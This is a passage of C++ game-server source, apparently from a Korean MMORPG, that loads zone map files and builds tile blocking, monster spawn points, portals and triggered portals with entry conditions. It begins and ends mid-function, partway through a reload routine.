	// MonsterAI를 위해 존의 영역을 구분지어놓은 사각형을 생성한다.
	m_OuterRect.set(0, 0, m_Width-1, m_Height-1);
	if (m_Width > 64 && m_Height > 64)
	{
		m_InnerRect.set(15, 15, m_Width-15, m_Height-15);
		m_CoreRect.set(25, 25, m_Width-25, m_Height-25);
	}
	else
	{
		m_InnerRect = m_CoreRect = m_OuterRect;
	}

	char str[80];
	char str2[80];

	for (ZoneCoord_t y=0; y<m_Height; y++)
	{
		for (ZoneCoord_t x=0; x<m_Width; x++)
		{
			BYTE flag = 0;
			SMP.read((char*)&flag, szBYTE);

			// 순서대로 지하, 지상, 공중 블록
			if (flag & 0x01) m_pTiles[x][y].setBlocked(Creature::MOVE_MODE_BURROWING);
			if (flag & 0x02) m_pTiles[x][y].setBlocked(Creature::MOVE_MODE_WALKING);
			if (flag & 0x04) m_pTiles[x][y].setBlocked(Creature::MOVE_MODE_FLYING);

			// 아무것도 없는 경우..
			// 몹 생성을 위한 좌표정보를 만들어둔다.
			if (flag==0 && m_InnerRect.ptInRect( x, y ))
			{
				m_MonsterRegenPositions.push_back( BPOINT( (BYTE)x, (BYTE)y ) );
			}

			// 마스터 레어인 경우: block이 하나라도 안 된 곳을 찾는다.
			if ((flag & 0x07)!=0x07 && (isMasterLair() || m_ZoneID == 3002))
			{
				m_EmptyTilePositions.push_back( BPOINT( (BYTE)x, (BYTE)y ) );
			}

			// 포탈 정보
			if (flag & 0x80)
			{
				BYTE	type;
				ZoneID_t targetZoneID;
				BYTE     targetX, targetY;
				SMP.read((char*)&type, szBYTE);

				PortalType_t portalType = PORTAL_NORMAL;

				bool bAddPortal = true;

				if (type == PORTAL_NORMAL)
				{
					SMP.read((char*)&targetZoneID, szZoneID);
					SMP.read((char*)&targetX,      szBYTE);
					SMP.read((char*)&targetY,      szBYTE);

					// 포탈을 생성해 준다.
					NormalPortal* pNormalPortal = new NormalPortal();
					pNormalPortal->setObjectType(PORTAL_NORMAL);
					pNormalPortal->setZoneID(targetZoneID);
					pNormalPortal->setX(targetX);
					pNormalPortal->setY(targetY);

					getObjectRegistry().registerObject(pNormalPortal);
					m_pTiles[x][y].addPortal(pNormalPortal);

					if (bOutput)
					{
						cout << "Normal(" << (int)x << "," << (int)y << "," << (int)targetZoneID << "," << (int)targetX << "," << (int)targetY << ")" << endl;
					}
				}
				else if (type == PORTAL_SLAYER)
				{
					SMP.read((char*)&targetZoneID, szZoneID);
					SMP.read((char*)&targetX,      szBYTE);
					SMP.read((char*)&targetY,      szBYTE);

					// 포탈을 생성해 준다.
					NormalPortal* pNormalPortal = new NormalPortal();
					pNormalPortal->setObjectType(PORTAL_SLAYER);
					pNormalPortal->setZoneID(targetZoneID);
					pNormalPortal->setX(targetX);
					pNormalPortal->setY(targetY);

					getObjectRegistry().registerObject(pNormalPortal);
					m_pTiles[x][y].addPortal(pNormalPortal);

					portalType = PORTAL_SLAYER;

					if (bOutput)
					{
						cout << "Slayer(" << (int)x << "," << (int)y << "," << (int)targetZoneID << "," << (int)targetX << "," << (int)targetY << ")" << endl;
					}
				}
				else if (type == PORTAL_VAMPIRE)
				{
					SMP.read((char*)&targetZoneID, szZoneID);
					SMP.read((char*)&targetX,      szBYTE);
					SMP.read((char*)&targetY,      szBYTE);

					// 포탈을 생성해 준다.
					NormalPortal* pNormalPortal = new NormalPortal();
					pNormalPortal->setObjectType(PORTAL_VAMPIRE);
					pNormalPortal->setZoneID(targetZoneID);
					pNormalPortal->setX(targetX);
					pNormalPortal->setY(targetY);

					getObjectRegistry().registerObject(pNormalPortal);
					m_pTiles[x][y].addPortal(pNormalPortal);

					portalType = PORTAL_VAMPIRE;

					if (bOutput)
					{
						cout << "Vampire(" << (int)x << "," << (int)y << "," << (int)targetZoneID << "," << (int)targetX << "," << (int)targetY << ")" << endl;
					}
				}
				else if (type == PORTAL_MULTI_TARGET)
				{
					BYTE size;
					SMP.read((char*)&size, szBYTE);

					// 포탈을 생성해 준다.
					MultiPortal* pMultiPortal = new MultiPortal();

					for(int i = 0; i < size; i++) 
					{
						SMP.read((char*)&targetZoneID, szZoneID);
						SMP.read((char*)&targetX,      szBYTE);
						SMP.read((char*)&targetY,      szBYTE);

						pMultiPortal->setObjectType(PORTAL_SLAYER);

						// 타겟 인포를 구성한다.
						PortalTargetInfo* pPortalTargetInfo = new PortalTargetInfo();
						pPortalTargetInfo->setZoneID(targetZoneID);
						pPortalTargetInfo->setX(targetX);
						pPortalTargetInfo->setY(targetY);
						pMultiPortal->setPortalTargetInfo(pPortalTargetInfo);
					}

					getObjectRegistry().registerObject(pMultiPortal);
					m_pTiles[x][y].addPortal(pMultiPortal);

					portalType = PORTAL_SLAYER;

					if (bOutput)
					{
						cout << "Multi(" << (int)x << "," << (int)y << "," << (int)targetZoneID << "," << (int)targetX << "," << (int)targetY << ")" << endl;
					}
				}
				else if ( type == PORTAL_GUILD )
				{
					SMP.read((char*)&targetZoneID, szZoneID);
					SMP.read((char*)&targetX,      szBYTE);
					SMP.read((char*)&targetY,      szBYTE);

					// 포탈을 생성해 준다.
					GuildPortal* pGuildPortal = new GuildPortal();
					pGuildPortal->setObjectType( PORTAL_GUILD );
					pGuildPortal->setZoneID( targetZoneID );
					pGuildPortal->setX( targetX );
					pGuildPortal->setY( targetY );

					getObjectRegistry().registerObject(pGuildPortal);
					m_pTiles[x][y].addPortal(pGuildPortal);

					if (bOutput)
					{
						cout << "Guild(" << (int)x << "," << (int)y << "," << (int)targetZoneID << "," << (int)targetX << "," << (int)targetY << ")" << endl;
					}

				}
				else if ( type == PORTAL_BATTLE )
				{
					SMP.read((char*)&targetZoneID, szZoneID);
					SMP.read((char*)&targetX,      szBYTE);
					SMP.read((char*)&targetY,      szBYTE);

					// 포탈을 생성해 준다.
					NormalPortal* pNormalPortal = new NormalPortal();
					pNormalPortal->setObjectType(PORTAL_NORMAL);
					pNormalPortal->setZoneID(targetZoneID);
					pNormalPortal->setX(targetX);
					pNormalPortal->setY(targetY);

					getObjectRegistry().registerObject(pNormalPortal);
					m_pTiles[x][y].addPortal(pNormalPortal);

					if (bOutput)
					{
						cout << "Battle(" << (int)x << "," << (int)y << "," << (int)targetZoneID << "," << (int)targetX << "," << (int)targetY << ")" << endl;
					}
				}
				else if (type == PORTAL_OUSTERS)
				{
					SMP.read((char*)&targetZoneID, szZoneID);
					SMP.read((char*)&targetX,      szBYTE);
					SMP.read((char*)&targetY,      szBYTE);

					// 포탈을 생성해 준다.
					NormalPortal* pNormalPortal = new NormalPortal();
					pNormalPortal->setObjectType(PORTAL_OUSTERS);
					pNormalPortal->setZoneID(targetZoneID);
					pNormalPortal->setX(targetX);
					pNormalPortal->setY(targetY);

					getObjectRegistry().registerObject(pNormalPortal);
					m_pTiles[x][y].addPortal(pNormalPortal);

					portalType = PORTAL_OUSTERS;

					if (bOutput)
					{
						cout << "Ousters(" << (int)x << "," << (int)y << "," << (int)targetZoneID << "," << (int)targetX << "," << (int)targetY << ")" << endl;
					}
				}
				else
				{
					bAddPortal = false;
				}

				// 포탈이 추가된 경우에
				// 목적지 존이 유료존이라면 
				// TriggeredPortal을 설정해야 한다.
				if (bAddPortal)
				{
					ZoneInfo* pTargetZoneInfo = NULL;
					try {
						pTargetZoneInfo = g_pZoneInfoManager->getZoneInfo(targetZoneID);
					} catch (NoSuchElementException& t) {
						throw Error("그런 존이 없다네");
					}

					Assert(pTargetZoneInfo!=NULL);

					// 기존의 Portal을 지울까?
					bool bDeleteOldPortal = false;

					if ( ( pTargetZoneInfo->isPayPlay() && !pZoneInfo->isPayPlay() )
						|| pTargetZoneInfo->isMasterLair()
						|| ( pTargetZoneInfo->isCastle() && !g_pCastleInfoManager->isCastleZone(targetZoneID, m_ZoneID))
						|| ( pTargetZoneInfo->isHolyLand() && !pZoneInfo->isHolyLand() )
						|| (isCastle() && g_pCastleInfoManager->isCastleZone( m_ZoneID, pTargetZoneInfo->getZoneID() ) )
						)
					{
						bDeleteOldPortal = true;
					}

					Tile& rTile = m_pTiles[x][y];
					
					// 기존의 Portal을 지우는 경우
					if (bDeleteOldPortal)
					{
						// 기존에 있던 portal을 제거한다.
						if (rTile.hasPortal())
						{
							Portal* pOldPortal = rTile.getPortal();
							rTile.deletePortal();

							delete pOldPortal;
						}
					}

					// 포탈을 생성하고, 등록한다.

					//----------------------------------------
					// 마스터 레어인 경우
					// by sigi. 2002.9.2
					//----------------------------------------
					if (pTargetZoneInfo->isMasterLair())
					{
						TriggeredPortal* pPortal = new TriggeredPortal();
						getObjectRegistry().registerObject(pPortal);

						// 포탈 내용을 로드한다.
						pPortal->setObjectType(portalType);

						//pPortal->load(m_ZoneID, left, top, right, bottom);
						TriggerManager& tm = pPortal->getTriggerManager();

						Trigger* pTrigger = new Trigger();

						pTrigger->setTriggerID( 0 );	// 의미없다.

						pTrigger->setTriggerType("QUEST");

						sprintf(str, "ConditionType : EnterMasterLair\n\t TargetZoneID : %d\n\t", (int)pTargetZoneInfo->getZoneID());
						pTrigger->setConditions( str );
						sprintf(str, "ActionType : ActivatePortal\n\t ZoneID : %d\n\t X : %d\n\t Y : %d\n\t", targetZoneID, targetX, targetY);
						pTrigger->setActions(str);

//                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %s",
//                                        g_pStringPool->c_str( STRID_CANNOT_ENTER ) );
                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %d", STRID_CANNOT_ENTER );

                        pTrigger->setCounterActions( str2 );

//						pTrigger->setCounterActions("ActionType : SystemMessage\n\t Content : 지금은 들어갈 수 없습니다.");

						tm.addTrigger(pTrigger);
						
						// 타일에다 포탈을 붙인다.
						rTile.addPortal(pPortal);

						//cout << "[" << (int)pTargetZoneInfo->getZoneID() << "] is MasterLair"
						//	 << endl;
					}
					//----------------------------------------
					// 아담의 성지로 들어갈려고 할 때
					//----------------------------------------
					else if (pTargetZoneInfo->isHolyLand() 
								&& !pZoneInfo->isHolyLand())
					{
						TriggeredPortal* pPortal = new TriggeredPortal();
						getObjectRegistry().registerObject(pPortal);

						// 포탈 내용을 로드한다.
						pPortal->setObjectType(portalType);

						//pPortal->load(m_ZoneID, left, top, right, bottom);
						TriggerManager& tm = pPortal->getTriggerManager();

						Trigger* pTrigger = new Trigger();

						pTrigger->setTriggerID( 0 );	// 의미없다.

						pTrigger->setTriggerType("QUEST");

						sprintf(str, "ConditionType : EnterHolyLand\n\t TargetZoneID : %d\n\t", (int)pTargetZoneInfo->getZoneID());
						pTrigger->setConditions( str );
						sprintf(str, "ActionType : ActivatePortal\n\t ZoneID : %d\n\t X : %d\n\t Y : %d\n\t", targetZoneID, targetX, targetY);
						pTrigger->setActions(str);

//                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %s",
//                                        g_pStringPool->c_str( STRID_CANNOT_ENTER_DURING_RACE_WAR ) );
                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %d", STRID_CANNOT_ENTER_DURING_RACE_WAR );


                        pTrigger->setCounterActions( str2 );

//						pTrigger->setCounterActions("ActionType : SystemMessage\n\t Content : 종족전쟁 중에는 신청을 하지 않았으면 들어갈 수 없습니다.");

						tm.addTrigger(pTrigger);
						
						// 타일에다 포탈을 붙인다.
						rTile.addPortal(pPortal);

						//cout << "[" << (int)pTargetZoneInfo->getZoneID() << "] is MasterLair"
						//	 << endl;
					}
					//----------------------------------------
					// 성 밖에서 성 안으로 들어가는 경우
					// isCastleZone 은 성 안에 포함되는 존들인지 체크한다.
					// (성 던전도 성 안이다)
					// by bezz, Sequoia 2003. 1.20.
					//----------------------------------------
					else if (pTargetZoneInfo->isCastle() 
								&& !g_pCastleInfoManager->isCastleZone(targetZoneID, m_ZoneID))
					{
						TriggeredPortal* pPortal = new TriggeredPortal();
						getObjectRegistry().registerObject(pPortal);

						// 포탈 내용을 로드한다.
						pPortal->setObjectType(portalType);

						//pPortal->load(m_ZoneID, left, top, right, bottom);
						TriggerManager& tm = pPortal->getTriggerManager();

						Trigger* pTrigger = new Trigger();

						pTrigger->setTriggerID( 0 );	// 의미없다.

						pTrigger->setTriggerType("QUEST");

						sprintf(str, "ConditionType : EnterCastle\n\t TargetZoneID : %d\n\t", (int)pTargetZoneInfo->getZoneID());
						pTrigger->setConditions( str );
						sprintf(str, "ActionType : ActivatePortal\n\t ZoneID : %d\n\t X : %d\n\t Y : %d\n\t", targetZoneID, targetX, targetY);
						pTrigger->setActions(str);

//                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %s",
//                                        g_pStringPool->c_str( STRID_CANNOT_ENTER ) );
                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %d", STRID_CANNOT_ENTER );

                        pTrigger->setCounterActions( str2 );

//						pTrigger->setCounterActions("ActionType : SystemMessage\n\t Content : 들어가실 수 없습니다.");

						tm.addTrigger(pTrigger);
						
						// 타일에다 포탈을 붙인다.
						rTile.addPortal(pPortal);

						//cout << "[" << (int)pTargetZoneInfo->getZoneID() << "] is MasterLair"
						//	 << endl;
					}
					//----------------------------------------
					// 성 지하 던젼으로 들어가는 입구
					// by Sequoia
					//----------------------------------------
					else if (isCastle()
							&& g_pCastleInfoManager->isCastleZone( m_ZoneID, pTargetZoneInfo->getZoneID() ) )
					{
						TriggeredPortal* pPortal = new TriggeredPortal();
						getObjectRegistry().registerObject(pPortal);

						// 포탈 내용을 로드한다.
						pPortal->setObjectType(portalType);

						//pPortal->load(m_ZoneID, left, top, right, bottom);
						TriggerManager& tm = pPortal->getTriggerManager();

						Trigger* pTrigger = new Trigger();

						pTrigger->setTriggerID( 0 );	// 의미없다.
						pTrigger->setTriggerType("QUEST");

						sprintf(str, "ConditionType : EnterCastleDungeon\n\t CastleZoneID : %d\n\t", m_ZoneID);
						pTrigger->setConditions( str );
						sprintf(str, "ActionType : ActivatePortal\n\t ZoneID : %d\n\t X : %d\n\t Y : %d\n\t", targetZoneID, targetX, targetY);
						pTrigger->setActions(str);

//                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %s",
//                                        g_pStringPool->c_str( STRID_CANNOT_ENTER_NOT_OWNER_GUILD ) );
                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %d", STRID_CANNOT_ENTER_NOT_OWNER_GUILD );

                        pTrigger->setCounterActions( str2 );

//						pTrigger->setCounterActions("ActionType : SystemMessage\n\t Content : 성 주인인 길드원이 아니면 들어가실 수 없습니다.");

						tm.addTrigger(pTrigger);
						rTile.addPortal(pPortal);
					}
					//----------------------------------------
					// 유료 존인 경우
					//----------------------------------------
					else if (pTargetZoneInfo->isPayPlay() && !pZoneInfo->isPayPlay())
					{
						TriggeredPortal* pPortal = new TriggeredPortal();
						getObjectRegistry().registerObject(pPortal);

						// 포탈 내용을 로드한다.
						pPortal->setObjectType(portalType);

						//pPortal->load(m_ZoneID, left, top, right, bottom);
						TriggerManager& tm = pPortal->getTriggerManager();

						Trigger* pTrigger = new Trigger();

						pTrigger->setTriggerID( 0 );	// 의미없다.

						pTrigger->setTriggerType("QUEST");
						pTrigger->setConditions("ConditionType : CanEnterPayZone\n\t");
						sprintf(str, "ActionType : ActivatePortal\n\t ZoneID : %d\n\t X : %d\n\t Y : %d\n\t", targetZoneID, targetX, targetY);
						pTrigger->setActions(str);

						// by sigi. 2002.10.30
						if (g_pConfig->getPropertyInt("IsNetMarble")==0)
						{
//                            sprintf( str2, "ActionType : SystemMessage\n\t Content : %s",
//                                            g_pStringPool->c_str( STRID_CANNOT_ENTER_PAY_ZONE ) );
                            sprintf( str2, "ActionType : SystemMessage\n\t Content : %d", STRID_CANNOT_ENTER_PAY_ZONE );

                            pTrigger->setCounterActions( str2 );

//							pTrigger->setCounterActions("ActionType : SystemMessage\n\t Content : 유료존이라서 들어갈 수 없습니다.");
						}
						else
						{
//                            sprintf( str2, "ActionType : SystemMessage\n\t Content : %s",
 //                                           g_pStringPool->c_str( STRID_CANNOT_ENTER ) );
                            sprintf( str2, "ActionType : SystemMessage\n\t Content : %d", STRID_CANNOT_ENTER );

                            pTrigger->setCounterActions( str2 );

//							pTrigger->setCounterActions("ActionType : SystemMessage\n\t Content : 지금은 갈 수 없습니다.");
						}

						tm.addTrigger(pTrigger);
						
						// 타일에다 포탈을 붙인다.
						rTile.addPortal(pPortal);
					}
				}
			} //if (flag & 0x80)
		} // for 
	} // for

	SMP.close();

	///*
	if (m_MonsterRegenPositions.size()==0)
	{
		printf("MonsterRegenPosition not exist: Width = %d, Height = %d\n", (int)m_Width, (int)m_Height);

		//Assert(m_MonsterRegenPositions.size()!=0);

		ZoneCoord_t outerMinX = m_Width/7;
		ZoneCoord_t outerMinY = m_Height/7;
		ZoneCoord_t outerMaxX = m_Width-outerMinX;
		ZoneCoord_t outerMaxY = m_Width-outerMinY;

		for (ZoneCoord_t y=outerMinY; y<outerMaxY; y++)
		{
			for (ZoneCoord_t x=outerMinX; x<outerMaxX; x++)
			{
				Tile& rTile = m_pTiles[x][y];

				if (!rTile.hasPortal() 
					&& !rTile.isGroundBlocked()
					&& !rTile.isAirBlocked()
					&& !rTile.isUndergroundBlocked())
				{
					m_MonsterRegenPositions.push_back( BPOINT( (BYTE)x, (BYTE)y ) );
				}
			}
		}

		Assert(m_MonsterRegenPositions.size()!=0);
	}

	if ( isDynamicZone() )
	{
		cout << "MonsterRegenPositions(" << m_ZoneID << "," << m_MonsterRegenPositions.size() << ")" << endl;
	}

	if ((isMasterLair() || m_ZoneID == 3002) && m_EmptyTilePositions.size()==0)
	{
		printf("MasterLair has No EmptyTilePosition\n");
		Assert(m_EmptyTilePositions.size()!=0);
	}
	//*/

	// Zone 정보를 세팅한다.
	m_ZoneType  = pZoneInfo->getZoneType();
	m_ZoneLevel = pZoneInfo->getZoneLevel();

	// 메모리 할당해주고...
	m_ppLevel = new ZoneLevel_t* [ m_Width ];
	for (uint i = 0; i < m_Width; i++)
		m_ppLevel[i] = new ZoneLevel_t[m_Height];

	// 존 레벨을 디폴트 값으로 초기화시킨다.
	for (ZoneCoord_t x = 0; x < m_Width; x++)
		for (ZoneCoord_t y = 0; y < m_Height; y++)
			m_ppLevel[x][y] = m_ZoneLevel;

	// SSI 정보 파일을 연다.
	string SSIFilename = g_pConfig->getProperty("HomePath") + "/data/" + pZoneInfo->getSSIFilename();
	ifstream SSI(SSIFilename.c_str(), ios::in | ios::binary );
	if (!SSI)
	{
		strcpy(lwrFilename, SSIFilename.c_str());
		strlwr( lwrFilename );
		SSI.open(lwrFilename, ios::in | ios::binary );

		//cout << "second chk : " << lwrFilename.c_str() << endl;

		if (!SSI)
		{
			StringStream msg;
			msg << SSIFilename << " not exist or cannot open it";
			throw FileNotExistException(msg.toString());
		}
	}

	int size = 0;
	SSI.read((char*)&size, szint);

	BYTE left, top, right, bottom, level;
	for (int i=0; i<size; i++)
	{
		SSI.read((char*)&level, szBYTE);
		SSI.read((char*)&left, szBYTE);
		SSI.read((char*)&top, szBYTE);
		SSI.read((char*)&right, szBYTE);
		SSI.read((char*)&bottom, szBYTE);

		if (bOutput)
		{
			cout << "LEVEL:" << (int)level << ",(" << (int)left << "," << (int)top << "," << (int)right << "," << (int)bottom << ")" << endl;
		}

		Assert(left <= right);
		Assert(top  <= bottom);

		for (int bx=left; bx<=right; bx++)
			for (int by=top; by<=bottom; by++)
				m_ppLevel[bx][by] = level;
	}

	SSI.close();

	// 트리거드 포탈을 로드한다.
	loadTriggeredPortal();

	// 몬스터 로드하고....
	m_pMonsterManager->load();


//#ifdef __XMAS_EVENT_CODE__
//	printf("Begin Event Monster Loading\n");
//	m_pEventMonsterManager->load();
//	printf("Event Monster Loading Completed\n");
//#endif

	// 마스터 레어인 경우
	// by sigi. 2002.9.2
	if (pZoneInfo->isMasterLair())
	{
		SAFE_DELETE(m_pMasterLairManager);
		m_pMasterLairManager = new MasterLairManager(this);
	}

	// 성인 경우
	// by sigi. 2003.1.24
	if (isCastle())
	{
		SAFE_DELETE(m_pWarScheduler);
		m_pWarScheduler = new WarScheduler(this);
		m_pWarScheduler->load();

		printf("[%d] Castle : WarScheduler->load\n", (int)getZoneID());
	}

	// 아이템 로드한다.
	loadItem();

//	if (isCastle())
//	{
//		CastleInfo* pCastleInfo = g_pCastleInfoManager->getCastleInfo( m_ZoneID );
//		m_pNPCManager->load( m_ZoneID, pCastleInfo->getRace() );
//	}
//	else
//	{
	// NPC 를 로딩한다.
	m_pNPCManager->load( m_ZoneID );
//	}

	loadEffect();

	// 게시판을 로드한다.
	loadBulletinBoard( this );

	// 스프라이트 갯수를 초기화한다.
	initSpriteCount();

	SAFE_DELETE(version);
	SAFE_DELETE(zonename);
	SAFE_DELETE(lwrFilename);

/*	if ( m_ZoneID == 1410 )
	{
		EffectCastingIcicleTrap* pEffect = new EffectCastingIcicleTrap( Effect::EFFECT_CLASS_ICICLE_DROP, this );
		registerObject( pEffect );
		
		pEffect->setStartXY( 116, 66 );
		pEffect->setLength( 48 );
		pEffect->setTick( 5 );
		pEffect->setUnit( 5 );
		pEffect->setDir( 7 );

		pEffect->setNextTime(0);
		pEffect->setDeadline(600);
		addEffect( pEffect );
	}*/

} catch ( Throwable& t )
  {
    cout << t.toString() << endl;
    Assert(false);}

	__END_DEBUG
	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// 존 파일에서 존 정보를 읽어서 로딩한다.
//////////////////////////////////////////////////////////////////////////////
void Zone::reload(bool bOutput)
	
{
	__BEGIN_TRY
	__BEGIN_DEBUG
try {

	DWORD  versionLen;
	char   version[128];
	WORD   zoneID;
	WORD   zoneGroupID;
	DWORD  zonenameLen;
	char   zonename[128];
	BYTE   zoneType;
	BYTE   zoneLevel;
	DWORD  descLen;
	char*  pDesc = NULL;
	char   lwrFilename[256];

	ZoneInfo* pZoneInfo = g_pZoneInfoManager->getZoneInfo(m_ZoneID);

	Assert(pZoneInfo!=NULL);

	setPayPlay( pZoneInfo->isPayPlay() );
	setPremiumZone( pZoneInfo->isPremiumZone() );
	setPKZone( pZoneInfo->isPKZone() );
	setNoPortalZone( pZoneInfo->isNoPortalZone() );
	setMasterLair( pZoneInfo->isMasterLair() );

	//filelog("zoneInfo.txt", "[%d] %d %d", (int)m_ZoneID, (int)isPayPlay(), (int)isPremiumZone());

	// SMP 정보 파일을 연다.
	string SMPFilename = g_pConfig->getProperty("HomePath") + "/data/" + pZoneInfo->getSMPFilename();
	ifstream SMP(SMPFilename.c_str(), ios::in | ios::binary );
	if (!SMP)
	{
		strcpy( lwrFilename, SMPFilename.c_str());
		strlwr( lwrFilename );
		SMP.open(lwrFilename, ios::in | ios::binary );

		//cout << "second chk : " << lwrFilename << endl;

		if (!SMP)
		{
			StringStream msg;
			msg << SMPFilename << " not exist or cannot open it";
			cerr << msg.toString() << endl;
			throw FileNotExistException(msg.toString());
		}
	}

    // read zone version
	SMP.read((char*)&versionLen,szDWORD);
	SMP.read(version,versionLen);
	version[versionLen] = 0;
	
	// read zone id
	SMP.read((char*)&zoneID,szWORD);
	
	// read zone group id (no use)
	SMP.read((char*)&zoneGroupID,szWORD);
	
	// read zone name
	SMP.read((char*)&zonenameLen,szDWORD);
	if (zonenameLen > 0)
	{
		SMP.read(zonename,zonenameLen);
		zonename[zonenameLen] = 0;
	}

    // read zone type & level 
	SMP.read((char*)&zoneType,szBYTE);
	SMP.read((char*)&zoneLevel,szBYTE);

	// read zone description
	SMP.read((char*)&descLen,szDWORD);
	if (descLen > 0)
	{
		pDesc = new char[descLen+1];
		SMP.read(pDesc,descLen);
		pDesc[descLen] = 0;
	
		SAFE_DELETE_ARRAY(pDesc);	// add '_ARRAY' moved to here.. by sigi 2002.5.2
	}

	// read zone width & height
	SMP.read((char*)&m_Width, szWORD);
	SMP.read((char*)&m_Height ,szWORD);

	Assert(m_Width <= maxZoneWidth);
	Assert(m_Height <= maxZoneHeight);

	uint i, x;


	if (m_pSectors==NULL)
	{
		// 섹터를 2차원 배열로 만들어 메모리를 할당한다.
		m_SectorWidth = (int)ceil((float)m_Width/(float)SECTOR_SIZE);
		m_SectorHeight = (int)ceil((float)m_Height/(float)SECTOR_SIZE);
		m_pSectors = new Sector*[m_SectorWidth];
		for (x=0; (int)x<m_SectorWidth; x++)
		{
			m_pSectors[x] = new Sector[m_SectorHeight];
		}

		// 섹터끼리 연결을 한다.
		VSRect srect(0, 0, m_SectorWidth-1, m_SectorHeight-1);
		for (int x=0; x<m_SectorWidth; x++)
		{
			for (int y=0; y<m_SectorHeight; y++)
			{
				for (uint d=0; d<9; d++)
				{
					int sectorx = x + dirMoveMask[d].x;
					int sectory = y + dirMoveMask[d].y;

					if (srect.ptInRect(sectorx, sectory))
					{
						m_pSectors[x][y].setNearbySector(d, &m_pSectors[sectorx][sectory]);
					}
				}
			}
		}

	}

	// m_pTiles 가 이미 없다면...
	if (m_pTiles==NULL)
	{
		// 타일을 2차원배열로 만들어 메모리를 할당한다.
		m_pTiles = new Tile* [ m_Width ];
		for (i = 0 ; i < m_Width ; i++) 
		{
			m_pTiles[i] = new Tile [m_Height];
		}

		// 각각의 타일에다가 섹터 포인터를 세팅한다.
		for (int x=0; x<m_Width; x++)
		{
			for (int y=0; y<m_Height; y++)
			{
				int sx = x/SECTOR_SIZE;
				int sy = y/SECTOR_SIZE;

				Assert(sx < m_SectorWidth && sy < m_SectorHeight);

				m_pTiles[x][y].setSector(&m_pSectors[sx][sy]);
			}
		}

	}

	// MonsterAI를 위해 존의 영역을 구분지어놓은 사각형을 생성한다.
	m_OuterRect.set(0, 0, m_Width-1, m_Height-1);
	if (m_Width > 64 && m_Height > 64)
	{
		m_InnerRect.set(15, 15, m_Width-15, m_Height-15);
		m_CoreRect.set(25, 25, m_Width-25, m_Height-25);
	}
	else
	{
		m_InnerRect = m_CoreRect = m_OuterRect;
	}


	char str[80];
	char str2[80];

	// 다시~
	m_MonsterRegenPositions.clear();
	m_EmptyTilePositions.clear();

	for (ZoneCoord_t y=0; y<m_Height; y++)
	{
		for (ZoneCoord_t x=0; x<m_Width; x++)
		{
			BYTE flag = 0;
			SMP.read((char*)&flag, szBYTE);

			// 순서대로 지하, 지상, 공중 블록
			if (flag & 0x01) m_pTiles[x][y].setBlocked(Creature::MOVE_MODE_BURROWING);
			if (flag & 0x02) m_pTiles[x][y].setBlocked(Creature::MOVE_MODE_WALKING);
			if (flag & 0x04) m_pTiles[x][y].setBlocked(Creature::MOVE_MODE_FLYING);

			// 아무것도 없는 경우..
			// 몹 생성을 위한 좌표정보를 만들어둔다.
			if (flag==0 && m_InnerRect.ptInRect( x, y ))
			{
				m_MonsterRegenPositions.push_back( BPOINT( (BYTE)x, (BYTE)y ) );
			}

			// 마스터 레어인 경우: block이 하나라도 안 된 곳을 찾는다.
			if ((flag & 0x07)!=0x07 && (isMasterLair() || m_ZoneID == 3002) )
			{
				m_EmptyTilePositions.push_back( BPOINT( (BYTE)x, (BYTE)y ) );
			}

			// 포탈 정보
			if (flag & 0x80)
			{
				BYTE	type;
				ZoneID_t targetZoneID;
				BYTE     targetX, targetY;
				SMP.read((char*)&type, szBYTE);

				PortalType_t portalType = PORTAL_NORMAL;

				bool bAddPortal = true;

				// 이미 포탈이 있다면 기존의 포탈을 지워준다.
				if (m_pTiles[x][y].hasPortal())
				{
					Portal* pPortal = m_pTiles[x][y].getPortal();
					SAFE_DELETE(pPortal);
					m_pTiles[x][y].deletePortal();
				}

				if (type == PORTAL_NORMAL)
				{
					SMP.read((char*)&targetZoneID, szZoneID);
					SMP.read((char*)&targetX,      szBYTE);
					SMP.read((char*)&targetY,      szBYTE);

					// 포탈을 생성해 준다.
					NormalPortal* pNormalPortal = new NormalPortal();
					pNormalPortal->setObjectType(PORTAL_NORMAL);
					pNormalPortal->setZoneID(targetZoneID);
					pNormalPortal->setX(targetX);
					pNormalPortal->setY(targetY);

					getObjectRegistry().registerObject(pNormalPortal);
					m_pTiles[x][y].addPortal(pNormalPortal);

					if (bOutput)
					{
						cout << "Normal(" << (int)x << "," << (int)y << "," << (int)targetZoneID << "," << (int)targetX << "," << (int)targetY << ")" << endl;
					}
				}
				else if (type == PORTAL_SLAYER)
				{
					SMP.read((char*)&targetZoneID, szZoneID);
					SMP.read((char*)&targetX,      szBYTE);
					SMP.read((char*)&targetY,      szBYTE);

					// 포탈을 생성해 준다.
					NormalPortal* pNormalPortal = new NormalPortal();
					pNormalPortal->setObjectType(PORTAL_SLAYER);
					pNormalPortal->setZoneID(targetZoneID);
					pNormalPortal->setX(targetX);
					pNormalPortal->setY(targetY);

					getObjectRegistry().registerObject(pNormalPortal);
					m_pTiles[x][y].addPortal(pNormalPortal);

					portalType = PORTAL_SLAYER;

					if (bOutput)
					{
						cout << "Slayer(" << (int)x << "," << (int)y << "," << (int)targetZoneID << "," << (int)targetX << "," << (int)targetY << ")" << endl;
					}
				}
				else if (type == PORTAL_VAMPIRE)
				{
					SMP.read((char*)&targetZoneID, szZoneID);
					SMP.read((char*)&targetX,      szBYTE);
					SMP.read((char*)&targetY,      szBYTE);

					// 포탈을 생성해 준다.
					NormalPortal* pNormalPortal = new NormalPortal();
					pNormalPortal->setObjectType(PORTAL_VAMPIRE);
					pNormalPortal->setZoneID(targetZoneID);
					pNormalPortal->setX(targetX);
					pNormalPortal->setY(targetY);

					getObjectRegistry().registerObject(pNormalPortal);
					m_pTiles[x][y].addPortal(pNormalPortal);

					portalType = PORTAL_VAMPIRE;

					if (bOutput)
					{
						cout << "Vampire(" << (int)x << "," << (int)y << "," << (int)targetZoneID << "," << (int)targetX << "," << (int)targetY << ")" << endl;
					}
				}
				else if (type == PORTAL_MULTI_TARGET)
				{
					BYTE size;
					SMP.read((char*)&size, szBYTE);

					// 포탈을 생성해 준다.
					MultiPortal* pMultiPortal = new MultiPortal();

					for(int i = 0; i < size; i++) 
					{
